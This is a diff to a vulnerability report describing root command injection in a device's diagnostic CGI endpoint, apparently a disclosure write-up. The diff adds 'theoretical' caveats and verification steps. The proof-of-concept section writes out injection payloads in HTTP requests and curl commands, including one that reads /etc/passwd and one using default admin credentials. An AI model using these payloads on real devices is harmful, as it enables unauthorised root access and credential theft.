@@ -118,16 +118,23 @@ The code only filters **4 characters**:
 This allows attackers to bypass the filter using command substitution syntax.
 
 ---
-
 ## Proof of Concept (PoC)
+
+### ⚠️ Important Note
+
+This vulnerability was discovered through **static analysis only**. The following PoC is **theoretical** and has not been tested on a live device. The actual exploitation may require:
+- Confirmation of the correct CGI endpoint path
+- Authentication credentials (if required)
+- Specific network configuration
 
 ### Attack Vector
 
-The vulnerability can be exploited through the diagnostic module, most likely accessible via:
-- `/cgi-bin/skk_set.cgi` (primary candidate)
-- `/skk_set.cgi` (alternative)
+Based on code analysis, the vulnerability is likely accessible through the diagnostic module. The most probable endpoints are:
+- `/cgi-bin/skk_set.cgi` (primary candidate based on string analysis)
+- `/skk_set.cgi` (alternative path)
+- Other CGI endpoints that route to the `setTools` function
 
-### HTTP Request Example
+### Theoretical HTTP Request
 
 ```http
 POST /cgi-bin/skk_set.cgi HTTP/1.1
@@ -138,15 +145,24 @@ Content-Length: 60
 diagnostic=1&IpAddr=127.0.0.1$(id>/tmp/pwned)&type=1
 ```
 
-### cURL Command
+### Theoretical cURL Command
 
 ```bash
+# Basic test (may require authentication)
 curl -X POST "http://<target>/cgi-bin/skk_set.cgi" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "diagnostic=1&IpAddr=127.0.0.1\$(id>/tmp/pwned)&type=1"
+
+# If authentication is required (example)
+curl -X POST "http://<target>/cgi-bin/skk_set.cgi" \
+  -u "admin:password" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "diagnostic=1&IpAddr=127.0.0.1\$(id>/tmp/pwned)&type=1"
 ```
 
 ### Bypass Techniques
+
+The incomplete filtering can be bypassed using:
 
 1. **Command Substitution with `$()`**:
    ```
@@ -168,21 +184,63 @@ curl -X POST "http://<target>/cgi-bin/skk_set.cgi" \
    IpAddr=127.0.0.1$(cat</etc/passwd>/tmp/result)
    ```
 
-### Expected Result
+### Expected Result (Theoretical)
 
-The injected command executes with root privileges, and the output is written to `/tmp/pwned` or `/tmp/result`.
+If successfully exploited:
+1. The injected command executes with root privileges
+2. Output is written to `/tmp/pwned` or `/tmp/result`
+3. Attacker gains arbitrary command execution capability
+
+### Verification Steps (For Authorized Testing Only)
+
+To verify this vulnerability on a device you own:
+
+1. **Identify the correct endpoint**:
+   - Check web interface for diagnostic tools
+   - Monitor network traffic when using ping/traceroute features
+   - Try common CGI paths: `/cgi-bin/skk_set.cgi`, `/skk_set.cgi`
+
+2. **Test basic functionality**:
+   ```bash
+   # Safe test with valid IP
+   curl -X POST "http://<target>/cgi-bin/skk_set.cgi" \
+     -d "diagnostic=1&IpAddr=127.0.0.1&type=1"
+   ```
+
+3. **Test command injection** (if step 2 succeeds):
+   ```bash
+   # Inject harmless command
+   curl -X POST "http://<target>/cgi-bin/skk_set.cgi" \
+     -d "diagnostic=1&IpAddr=127.0.0.1\$(echo test>/tmp/verify)&type=1"
+   ```
+
+4. **Verify execution**:
+   - Check if `/tmp/verify` file exists
+   - Check system logs for command execution
+
+### Limitations
+
+- **Endpoint not confirmed**: The exact CGI path requires verification
+- **Authentication unknown**: May require valid credentials
+- **Network access**: May be restricted to LAN only
+- **Firmware variations**: Different firmware versions may have different paths
 
 ---
 
 ## Impact
 
-An attacker who can access the diagnostic interface can:
+**If successfully exploited**, an attacker who can access the diagnostic interface can:
 - Execute arbitrary system commands as root
 - Read sensitive files (passwords, configuration)
 - Modify system configuration
 - Install backdoors or malware
 - Pivot to internal network
 - Cause denial of service
+
+**Note**: The actual exploitability depends on:
+- Whether the endpoint is accessible without authentication
+- Whether the endpoint is exposed to WAN
+- Network configuration and firewall rules
 
 ---
 
